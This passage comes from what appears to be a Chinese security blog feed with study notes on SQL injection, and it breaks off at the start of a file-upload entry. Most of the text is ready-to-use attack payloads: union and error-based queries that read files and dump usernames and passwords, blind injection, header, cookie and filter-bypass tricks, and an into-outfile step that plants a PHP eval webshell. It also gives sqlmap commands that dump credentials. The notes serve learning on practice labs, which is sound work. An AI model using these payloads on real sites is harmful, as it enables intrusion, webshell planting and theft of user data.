-B</span><br></pre></td></tr></table></figure><h2 id="mysql注入读写文件"><a href="#mysql注入读写文件" class="headerlink" title="mysql注入读写文件"></a>mysql注入读写文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">1.mysql注入读文件</span><br><span class="line">读取前提：</span><br><span class="line">用户权限足够大，最好是root权限；</span><br><span class="line">secure_file_priv不为NULL</span><br><span class="line"></span><br><span class="line">使用方法：select load_file(’具体文件路径‘)</span><br><span class="line">因为联合查询只能输出一条，需要使其报错，出错位置表示可以在相应的位置查询数据。</span><br><span class="line">xxx.xxx.com&#x2F;?id&#x3D;-1&#39; union select 1,load_file(F:\\flag.txt),3 --+</span><br><span class="line"></span><br><span class="line">2.mysql注入写文件</span><br><span class="line">前提：</span><br><span class="line">权限允许写入</span><br><span class="line">set globle general_log &#x3D;on </span><br><span class="line"></span><br><span class="line">写入方法：into outfile ‘具体路径，要用双\\，因为mysql会对\进行转义’</span><br><span class="line">xxx.xxx.com&#x2F;?id&#x3D;-1&#39;)),1,&#39;&lt;?php phpinfo;?&gt;&#39;,3 into outfile &#39;E:\\phpstudy\\www\\sqli\\less7\\1.php&#39;--+</span><br><span class="line"></span><br><span class="line">3.写入webshell</span><br><span class="line">写入一句话木马，然后使用菜刀进行连接。</span><br><span class="line">xxx.xxx.com&#x2F;?id&#x3D;-1&#39;)) union select 1，&#39;&lt;?php @eval($_POST[&#39;x&#39;];？&gt;)&#39;,3  into outfile &#39;C:\\phpstudy\\php\\www\\sqli\\less7\\2.php&#39;--+</span><br><span class="line"></span><br><span class="line">4.使用sqlmap</span><br><span class="line">读文件：</span><br><span class="line">sqlmap -u &quot;xxx.xxx.com&#x2F;?id&#x3D;1&quot; --flie-read &quot;E:\\flag.txt&quot;</span><br><span class="line">写文件：</span><br><span class="line">sqlmap -u &quot;xxx.xxx.com&#x2F;?id&#x3D;1&quot; --file-write &quot;&#x2F;root&#x2F;1.php&quot; --file-dest &quot;F:\\1.php&quot;</span><br></pre></td></tr></table></figure><h2 id="POST时间与布尔盲注"><a href="#POST时间与布尔盲注" class="headerlink" title="POST时间与布尔盲注"></a>POST时间与布尔盲注</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">1.POST</span><br><span class="line">POST发送数据给服务器处理，数据包含HTTP信息正文中。</span><br><span class="line">POST请求会向指定资源提交数据，请求服务器进行处理，如表单数据、文件上传等，请求数据会被包含在请求体中。</span><br><span class="line">POST方法可能会创建新的资源和修改现有资源。</span><br><span class="line">使用POST方法时，查询字符串在POST信息中单独存在，和HTTP请求一起发送到服务器</span><br><span class="line">POST &#x2F;xxx.xxx.html HTTP&#x2F;1.1</span><br><span class="line">Host：xxx.xxx.com</span><br><span class="line"></span><br><span class="line">2.POST时间盲注</span><br><span class="line">在POST提交的参数后加and if(length(database())&gt;5,sleep(5),null)</span><br><span class="line">如果执行的页面响应时间大于5秒，则存在注入。</span><br><span class="line">例子：</span><br><span class="line">uname&#x3D;admin&#39; and（select(if(length(database())&gt;5,sleep(5),null))）--+ &amp;passwd&#x3D;1234&amp;submit&#x3D;submit</span><br><span class="line">可以观察到响应速度明显慢</span><br><span class="line"></span><br><span class="line">3.POST布尔盲注</span><br><span class="line">在存在注入点POST提交的参数后加入if判断正确或错误的语句。</span><br><span class="line">select length(database());</span><br><span class="line">select substr(database(),1,1);</span><br><span class="line">select ascii(substr(database(),1,1);</span><br><span class="line">select ascii(substr(database(),1,1))&gt;N;</span><br><span class="line">例子：</span><br><span class="line">uname&#x3D;admin&#39; and（length(database())&gt;5)--+ &amp;passwd&#x3D;1234</span><br></pre></td></tr></table></figure><h2 id="POST基于错误注入"><a href="#POST基于错误注入" class="headerlink" title="POST基于错误注入"></a>POST基于错误注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">1.Burpsuite抓取HTTP请求</span><br><span class="line">Burpsuite需要安装JAVA环境，同时在浏览器设置本机局域网代理。</span><br><span class="line"></span><br><span class="line">2.POST基于错误单引号注入</span><br><span class="line">在登录界面抓取用户名、密码后，点击send to repeter</span><br><span class="line">输入\使其报错，看报错内容，闭合前面并注释掉后面</span><br><span class="line">POST的内容为：uname&#x3D;admin&amp; passwd&#x3D;1234 &amp;submit&#x3D;submit</span><br><span class="line">注入为：uname&#x3D;admin &amp;passwd&#x3D;1234&#39; or 1&#x3D;1--+ &amp;submit&#x3D;submit</span><br><span class="line"></span><br><span class="line">3.POST基于错误双引号注入、</span><br><span class="line">输入\使其报错，看报错内容，闭合前面并注释后面</span><br><span class="line">POST内容为uname&#x3D;admin &amp;passwd&#x3D;1234 </span><br><span class="line">注入为: uname&#x3D;admin &amp;passwd&#x3D;1234&#39;&#39;) or 1&#x3D;1--+</span><br><span class="line"></span><br><span class="line">4.使用sqlmap POST注入</span><br><span class="line">方法：</span><br><span class="line">复制Burpsuite截断的HTTP请求数据包到文本文件中，使用sqlmap -r 文件路径 -p 指定探测参数</span><br><span class="line"></span><br><span class="line">python sqlmap.py -r test.txt -p passwd --technique E </span><br><span class="line">&#x2F;&#x2F;指定对passwd参数进行基于错误注入</span><br><span class="line">python sqlmap.py -r test.txt -p passwd --technique E --current-db</span><br><span class="line">&#x2F;&#x2F;查看当前使用的数据库名称</span><br><span class="line">python sqlmap.py -r test.txt -p passwd -D security --tables </span><br><span class="line">&#x2F;&#x2F;探测指定数据库的表</span><br><span class="line">python sqlmap.py -r test.txt -p passwd -D security -T user --columns </span><br><span class="line">&#x2F;&#x2F;探测user表中的字段</span><br><span class="line">pyhton sqlmap.py -r test.txt -p passwd -D security -T user -C &quot;username,passwd&quot; --dump</span><br><span class="line">&#x2F;&#x2F;探测指定字段username及passwd的内容</span><br></pre></td></tr></table></figure><h2 id="GET报错注入-双注入"><a href="#GET报错注入-双注入" class="headerlink" title="GET报错注入-双注入"></a>GET报错注入-双注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">1.GET报错注入</span><br><span class="line">报错注入形式上是两个嵌套的查询，即select....(select....)，里面的被称为子查询，顺序是先执行子查询，然后再执行外面的select。</span><br><span class="line">双注入主要涉及的函数：</span><br><span class="line">rand()随机函数，返回0-1之间的某个值</span><br><span class="line">floor(a)取整函数，返回小于等于a，且值最接近a的一个整数</span><br><span class="line">count()聚合函数也称作计数函数，返回查询对象的总数</span><br><span class="line">group by clause分组语句，按照查询结果分组</span><br><span class="line">通过报错来显示具体的信息</span><br><span class="line"></span><br><span class="line">查询的时候如果使用rand()的话，该值会被计算多次。在使用group by的时候，floor(rand(0)*2)会被执行一次，如果虚表不存在记录，插入虚表的时候会再被执行一次。在一次多记录的查询过程中，floor(rand(0)*2)的值是定性的，为011011</span><br><span class="line">payload示例：</span><br><span class="line">slect count(*) from table group by floor(rand(0)*2)</span><br><span class="line"></span><br><span class="line">2.GET单引号报错注入</span><br><span class="line">获取数据库：</span><br><span class="line">xxx.xxx.com&#x2F;?id&#x3D;-1&#39; union select 1,2,3 from (select count(*),concat((select conact(version(),0x3a,0x3a,database(),0x3a,0x3a,user(),0x3a)limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a --+</span><br><span class="line">获取表名：</span><br><span class="line">xxx.xxx.com?id&#x3D;-1&#39; union select 1,2,3 from (select count(*),concat((select conact(table_name,0x3a,0x3a)from information_schema.tables where table_schema&#x3D;database()limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a --+</span><br><span class="line">获取用户信息：</span><br><span class="line">xxx.xxx.com&#x2F;?id&#x3D;-1&#39; union select 1,2,3 from(select count(*),concat((select concat(usename,0x3a,0x3a,passwd,0x3a,0x3a)from security.users limit 1,1)floor(rand(0)*2))x from information_schema.tables group by x)a --+</span><br><span class="line"></span><br><span class="line">3.GET双引号报错注入</span><br><span class="line">与单引号报错注入的区别在于闭合双引号</span><br></pre></td></tr></table></figure><h2 id="HTTP头注入"><a href="#HTTP头注入" class="headerlink" title="HTTP头注入"></a>HTTP头注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">1.HTTP头注入</span><br><span class="line">对HTTP头的内容没有进行过滤，从而造成注入产生</span><br><span class="line"></span><br><span class="line">2.HTTP user-Agent注入</span><br><span class="line">程序代码：</span><br><span class="line">$insert&#x3D;&quot;INSERT INTO &#39;security&#39;.&#39;uagents&#39;(&#39;uagent&#39;,&#39;ip_address&#39;,&#39;username&#39;)VALUES(&#39;$uagent&#39;,&#39;$IP&#39;,$uname)&quot;;</span><br><span class="line"></span><br><span class="line">payload：</span><br><span class="line">updatexml(xml_document,xpath_string,new_value):</span><br><span class="line">第一个参数：XML文档对象名称</span><br><span class="line">第二个参数：XPath字符串</span><br><span class="line">第三个参数：替换查找到的符合条件的数据</span><br><span class="line">&#39;and updatexml(1,concat(0x7e,(select @@version),0x7e),1) or &#39;1&#39;&#x3D;&#39;1</span><br><span class="line"></span><br><span class="line">3.HTTP Referer注入</span><br><span class="line">注入位置在Referer</span><br><span class="line"></span><br><span class="line">4.使用sqlmap进行测试</span><br><span class="line">sqlmap-u &quot;xxx.xxx.com&#x2F;post.php&quot; --forms </span><br><span class="line">&#x2F;&#x2F;对POST表单提交的内容进行测试</span><br><span class="line">sqlmap -u &quot;xxx.xxx.com&#x2F;login.asp&quot; --data &quot;n&#x3D;1&amp;m&#x3D;1&quot;</span><br><span class="line">&#x2F;&#x2F;指定参数进行探测</span><br><span class="line"></span><br><span class="line">指定注入位置进行注入，在保存的文件中，将对应参数修改为 *</span><br><span class="line">sqlmap.py -r test.txt</span><br></pre></td></tr></table></figure><h2 id="注入绕过"><a href="#注入绕过" class="headerlink" title="注入绕过"></a>注入绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1.大小写绕过</span><br><span class="line">通过修改关键字内字母大小写来绕过过滤措施，如</span><br><span class="line">AnD 1&#x3D;1</span><br><span class="line">OrdER </span><br><span class="line"></span><br><span class="line">2.双写绕过</span><br><span class="line">如果过滤机制设置出现关键字之后替换为空，则可以利用双写绕过。</span><br><span class="line">uniunionon</span><br><span class="line"></span><br><span class="line">3.编码绕过</span><br><span class="line">利用URL在线编码，绕过SQL注入的过滤机制。</span><br><span class="line">站长之家在线编码</span><br><span class="line"></span><br><span class="line">4.内联注释绕过</span><br><span class="line">&#x2F;!*select*&#x2F;</span><br></pre></td></tr></table></figure><h2 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1.关于cookie</span><br><span class="line">服务器可以利用cookie包含信息的任意性来判断在HTTP传输中的状态。</span><br><span class="line">Cookie最典型的应用是判定注册用户是否已经登录网站，另一个是购物车处理，用户在不同的页面选择不同的商品，这些信息都会写入cookie，以便在最后付款时提取信息。</span><br><span class="line">在浏览器中，调试工具中输入document.cookie可查看当前的cookie值</span><br><span class="line"></span><br><span class="line">2.cookie注入</span><br><span class="line">代码中使用cookie传递参数，但是没有对Cookie中传递的参数进行过滤，导致SQL注入漏洞产生。</span><br><span class="line">&#x2F;&#x2F;利用&#39; or 1&#x3D;1 --+输出第一个用户名和密码</span><br><span class="line">payload：</span><br><span class="line">cookie：uname&#x3D;admin&#39; or 1&#x3D;1 --+; _guid&#x3D;%9999239293_324324</span><br><span class="line">&#x2F;&#x2F;用报错爆当前数据库版本</span><br><span class="line">payload：</span><br><span class="line">cookie：uname&#x3D;admin&#39; and updatexml(1,concat(0x7e,version(),0x7e),1)--+ _guid&#x3D;3432432432_343242</span><br><span class="line"></span><br><span class="line">3.使用sqlmap进行cookie注入</span><br><span class="line">sqlmap -r test.txt --level 3 然后在注入位置改为 *</span><br><span class="line">sqlmap -r target.txt --level 3 --batch</span><br></pre></td></tr></table></figure><h2 id="Cookie-Base64编码注入"><a href="#Cookie-Base64编码注入" class="headerlink" title="Cookie  Base64编码注入"></a>Cookie  Base64编码注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">1.Base64</span><br><span class="line">Base64编码是从二进制到字符的过程，可用在HTTP环境下传递较长的标识信息。</span><br><span class="line">Base64是比较常见的传输8Bit字节码的编码方式之一，即基于64个可打印字符来表示二进制数据的方法。</span><br><span class="line"></span><br><span class="line">将原始内容转换为二进制，从左到右依次取6位，然后在最高位补两位0，形成新内容。</span><br><span class="line">编码规则：</span><br><span class="line">把3个字符变成4个字符；</span><br><span class="line">每76个字符加一个换行符；</span><br><span class="line">最后的结束符也要处理，结束符一般为&#x3D;&#x3D;。</span><br><span class="line"></span><br><span class="line">2.注入产生原因</span><br><span class="line">base64_decode(str):PHP语言中用于解密Base64解密字符串的函数。</span><br><span class="line"></span><br><span class="line">3.cookie base64注入</span><br><span class="line">base64编码后的admin：YWRtaW4&#x3D;</span><br><span class="line">&quot; or 1&#x3D;1 base64编码：liBvciAxPTEglw&#x3D;&#x3D;</span><br><span class="line">使用base64编码后的注入语句，插入到cookie对应位置进行注入探测</span><br><span class="line"></span><br><span class="line">4.使用sqlmap进行测试</span><br><span class="line">python sqlmap.py -r test.txt --level 3 --batch --tamper base64encode.py</span><br></pre></td></tr></table></figure><h2 id="过滤注释符注入"><a href="#过滤注释符注入" class="headerlink" title="过滤注释符注入"></a>过滤注释符注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1.mysql注释符</span><br><span class="line">注释符作用：用于标记某段代码，起到对代码功能的说明作用，注释掉的内容不会被执行。</span><br><span class="line">单行注释： --+或--空格 或#</span><br><span class="line">多行注释：&#x2F;*多行注释内容*&#x2F;</span><br><span class="line">对于正常的SQL语句，注释符起到说明功能的作用。</span><br><span class="line">在SQL注入过程中，起到闭合单引号、双引号、单括号、多括号的功能。</span><br><span class="line"></span><br><span class="line">2.绕过过滤注释符进行注入</span><br><span class="line">利用注释符不能成功闭合单引号时，可利用or &#39;1&#39;&#x3D;1&#39;闭合单引号等</span><br><span class="line">payload：</span><br><span class="line">xxx.xxx.com&#x2F;?id&#x3D;-1&#39; union select 1,2,&#39;3</span><br><span class="line">xxx.xxx.com&#x2F;?id&#x3D;-1&#39; union select 1,database(),&#39;3</span><br></pre></td></tr></table></figure><h2 id="绕过过滤and和or的注入"><a href="#绕过过滤and和or的注入" class="headerlink" title="绕过过滤and和or的注入"></a>绕过过滤and和or的注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1.mysql基础</span><br><span class="line">Mysql中对大小写不敏感，大写与小写一样</span><br><span class="line">十六进制和URL编码的内容mysql可进行正常识别</span><br><span class="line">符号和关键字替换： and&#x3D;&amp;&amp;  or&#x3D;||</span><br><span class="line">内联注释与多行注释： &#x2F;*！内联注释*&#x2F;  &#x2F;*多行注释*&#x2F;</span><br><span class="line"></span><br><span class="line">2.绕过过滤and和or的注入</span><br><span class="line">绕过策略：</span><br><span class="line">大小写变形- Or、OR、oR、And、aND等，忽略大写过滤时失效</span><br><span class="line">敏感词汇中添加注释- a&#x2F;**&#x2F;nd  </span><br><span class="line">双写绕过- oorr</span><br><span class="line">利用符号代替- and&#x3D;&amp;&amp;  or&#x3D;||</span><br><span class="line">payload：</span><br><span class="line">xxx.xxx.com&#x2F;?id&#x3D;-1&#39; || 1&#x3D;1 --+</span><br></pre></td></tr></table></figure><h2 id="绕过过滤空格的sql注入"><a href="#绕过过滤空格的sql注入" class="headerlink" title="绕过过滤空格的sql注入"></a>绕过过滤空格的sql注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1.绕过策略：</span><br><span class="line">使用hex、urldecode编码方式：空格URL编码%0a TAB键(水平)%09</span><br><span class="line">%0a 新建一行</span><br><span class="line">%0c 新的一页</span><br><span class="line">%0d return功能</span><br><span class="line">%0b TAB键(垂直)</span><br><span class="line"></span><br><span class="line">2.使用sqlmap进行测试</span><br><span class="line">sqlmap -u &quot;URL&quot; --hex --dbs --batch</span><br></pre></td></tr></table></figure><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">1.宽字节</span><br><span class="line">GBK占用两字节</span><br><span class="line">ASCII码占用一字节</span><br><span class="line">PHP中编码为GBK，函数执行添加的是ASCII编码，MySQL默认字符集为GBK等宽字节字符集</span><br><span class="line"></span><br><span class="line">%DF:会被PHP的addslashes函数转义为&quot;%DF\&#39;&quot;,&quot;\&quot;即URL编码中的&quot;%5C&quot;,也就是说&quot;%DF&quot;会被转成&quot;%DF%5C%27&quot;。如果网站的字符集为GBK，MySQL使用的编码也是GBK，就会认为&quot;%DF%5C%27&quot;是一个宽字符。也就是&quot;縗&#39;&quot;。单引号就出来了</span><br><span class="line"></span><br><span class="line">2.宽字节sql注入</span><br><span class="line">payload：</span><br><span class="line">id&#x3D;%df&#39; --+  </span><br><span class="line">&#x2F;&#x2F;%DF 闭合前面，--+闭合后面</span><br><span class="line">例子：</span><br><span class="line">xxx.xxx.com&#x2F;？id&#x3D;-1%df&#39; union select 1,user(),version() --+</span><br><span class="line"></span><br><span class="line">3.宽字节注入扩展</span><br><span class="line">最常使用的宽字节注入是利用%df，其实只要第一个ascii码大于128就可以，比如ascii码为129的，就可以。</span><br><span class="line">如何转换为URL编码呢，先将129（十进制）转换为十六进制，也就是0x81，然后在十六进制前加%即可，即%81。</span><br><span class="line">GBK首字节对0x81-0xFE，尾字节对应0x40-0xFE（除0x7F）</span><br><span class="line">payload：</span><br><span class="line">xxx.xxx.com&#x2F;?id&#x3D;-1%81&#39; union select 1,user(),database() --+</span><br></pre></td></tr></table></figure><h2 id="二阶注入"><a href="#二阶注入" class="headerlink" title="二阶注入"></a>二阶注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1.二阶注入</span><br><span class="line">第一次客户端进行注册，注册信息经网站服务器转给数据库服务器进行存储，第二次进行查询时，将第一次的注册信息作为payload进行查询数据库信息。</span><br><span class="line">update 或set...where username&#x3D;注册用户名</span><br><span class="line"></span><br><span class="line">2.二阶注入利用</span><br><span class="line">注册用户admin&#39;-- -</span><br><span class="line">注册成功后，使用注册的用户登录，修改密码</span><br><span class="line">查看网页源代码，将密码类型改为text</span><br><span class="line">修改密码后发现，已经成功修改了admin的密码</span><br><span class="line"></span><br><span class="line">因为-- 注释掉了后面的passwd，使得直接修改了admin的密码</span><br><span class="line">3.二阶注入的危害</span><br><span class="line">注入payload触发二次SQL注入</span><br><span class="line">注入payload触发XSS攻击</span><br></pre></td></tr></table></figure><h2 id="ASP-Access注入"><a href="#ASP-Access注入" class="headerlink" title="ASP+Access注入"></a>ASP+Access注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">1.ASP+Access网站技术</span><br><span class="line">ASP是微软公司开发的服务器端脚本环境，可用来创建动态交互网页并建立强大的web应用程序。ASP文件可包含文本、HTML和com组件调用。</span><br><span class="line"></span><br><span class="line">Microsoft office Access是由微软发布的关系数据库管理系统，只有表的概念。</span><br><span class="line"></span><br><span class="line">sqlmap.py -u &quot;xxx.xxx.com&#x2F;xxx.asp?id&#x3D;x&quot; --tables</span><br><span class="line"></span><br><span class="line">2.Access偏移注入</span><br><span class="line">原理：</span><br><span class="line">借用数据库的自连接查询让数据库内部发生乱序，从而偏移出所需要的字段在页面上显示。</span><br><span class="line"></span><br><span class="line">利用场景：</span><br><span class="line">解决知道Access数据库知道表名，但是得不到字段的SQL注入困境。字段名取名复杂，字典暴力破解字段名不成功。</span><br><span class="line"></span><br><span class="line">注入流程：</span><br><span class="line">判断字段数：order by</span><br><span class="line">判断表名：使用union select * from 表名来获取</span><br><span class="line">利用注入公式进行注入</span><br><span class="line"></span><br><span class="line">注入实践：</span><br><span class="line">基本公式为order by出的字段数减去*号的字段数，然后再用order by的字段数减去（上步得出的答案的2倍）。</span><br><span class="line">如18-11&#x3D;7，18-7*2&#x3D;4</span><br><span class="line"></span><br><span class="line">例子：</span><br><span class="line">http:&#x2F;&#x2F;xxx.com&#x2F;1.asp?id&#x3D;x union select 1,2,3,4 a.id,b.id, * from(sys_admin as a inner join sys_admin as b on a.id&#x3D;b.id)</span><br><span class="line">&#x2F;&#x2F;这里的union select 1，2，3，4就是刚才的得出来的长度</span><br><span class="line">&#x2F;&#x2F;后面是sql公式</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>文件上传</title>
    <link href="http://yoursite.com/2020/08/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <id>http://yoursite.com/2020/08/01/文件上传/</id>
    <published>2020-08-01T14:29:08.000Z</published>
    <updated>2020-08-01T14:32:13.930Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="绕过前端JS验证的文件上传"><a href="#绕过前端JS验证的文件上传" class="headerlink" title="绕过前端JS验证的文件上传"></a>绕过前端JS验证的文件上传</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1.Burpsuite去除JS验证</span><br><span class="line">在Burpsuite的Proxy功能项的option下，有一个remove all javascripts选项，勾选上。</span><br><span class="line">或者浏览器直接禁用JS脚本执行。</span><br><span class="line"></span><br><span class="line">2.浏览器审计工具去除JS验证</span><br><span class="line">利用浏览器的审查工具去除JS之后，保存为新文件然后进行文件上传。</span><br><span class="line">打开审查工具界面，找到onsubmit&#x3D;&quot;return checkfile()&quot;</span><br><span class="line"></span><br><span class="line">3.上传webshell，菜刀连接</span><br></pre></td></tr></table></figure><h2 id="绕过MIME-Type验证的文件上传"><a href="#绕过MIME-Type验证的文件上传" class="headerlink" title="绕过MIME-Type验证的文件上传"></a>绕过MIME-Type验证的文件上传</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">1.MIME-Type</span><br><span class="line">MIME：多用途互联网邮件扩展类型。设定某种扩展名的文件用一种应用程序来打开的方式类型，当扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。</span><br><span class="line">多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。</span><br><span class="line"></span><br><span class="line">常见文件的MIME-Type：</span><br><span class="line">PDF文档.pdf</span><br><span class="line">Microsoft word文件：.word</span><br><span class="line">PNG图像.png  image&#x2F;png</span><br><span class="line">GIF图像.gif  image&#x2F;gif</span><br><span 